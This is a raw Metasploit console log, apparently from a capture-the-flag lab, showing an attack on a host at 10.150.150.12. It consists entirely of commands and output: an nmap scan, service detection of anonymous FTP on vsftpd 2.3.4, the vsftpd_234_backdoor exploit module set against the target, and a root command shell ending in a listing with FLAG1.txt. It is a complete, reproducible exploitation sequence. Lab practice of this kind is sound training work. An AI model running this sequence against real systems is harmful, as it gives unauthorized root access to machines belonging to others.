
***
[msf](Jobs:0 Agents:0) >> db_nmap 10.150.150.12
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-01 19:36 EAT
[*] Nmap: Nmap scan report for 10.150.150.12
[*] Nmap: Host is up (0.24s latency).
[*] Nmap: Not shown: 998 closed tcp ports (reset)
[*] Nmap: PORT   STATE SERVICE
[*] Nmap: 21/tcp open  ftp
[*] Nmap: 22/tcp open  ssh
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 3.87 seconds
[msf](Jobs:0 Agents:0) >> db_nmap -sV -sC -p21,22 10.150.150.12
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-01 19:37 EAT
[*] Nmap: Nmap scan report for 10.150.150.12
[*] Nmap: Host is up (0.29s latency).
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 21/tcp open  ftp     vsftpd 2.0.8 or later
[*] Nmap: |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
[*] Nmap: | ftp-syst:
[*] Nmap: |   STAT:
[*] Nmap: | FTP server status:
[*] Nmap: |      Connected to 10.66.66.134
[*] Nmap: |      Logged in as ftp
[*] Nmap: |      TYPE: ASCII
[*] Nmap: |      No session bandwidth limit
[*] Nmap: |      Session timeout in seconds is 300
[*] Nmap: |      Control connection is plain text
[*] Nmap: |      Data connections will be plain text
[*] Nmap: |      At session startup, client count was 2
[*] Nmap: |      vsFTPd 2.3.4 - secure, fast, stable
[*] Nmap: |_End of status
[*] Nmap: 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
[*] Nmap: | ssh-hostkey:
[*] Nmap: |   3072 1f:bc:e3:e3:5b:eb:ff:b2:30:a7:4c:33:11:bf:67:a3 (RSA)
[*] Nmap: |   256 c8:e4:18:29:59:d0:4e:ea:dc:05:50:bc:d5:6f:e5:00 (ECDSA)
[*] Nmap: |_  256 58:d5:70:6d:0d:80:71:0a:ba:8e:1c:7a:c7:37:2f:e2 (ED25519)
[*] Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 23.44 seconds
[msf](Jobs:0 Agents:0) >> search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor

[msf](Jobs:0 Agents:0) >> use 1
[*] No payload configured, defaulting to cmd/unix/interact
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> set RHOSTS 10.150.150.12
RHOSTS => 10.150.150.12
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> run

[*] 10.150.150.12:21 - Banner: 220 Through the portal... - into nothingness or bliss?
[*] 10.150.150.12:21 - USER: 331 Please specify the password.
[+] 10.150.150.12:21 - Backdoor service has been spawned, handling...
[+] 10.150.150.12:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (10.66.66.134:43459 -> 10.150.150.12:6200) at 2024-09-01 19:49:07 +0300

ls
FLAG1.txt
snap


***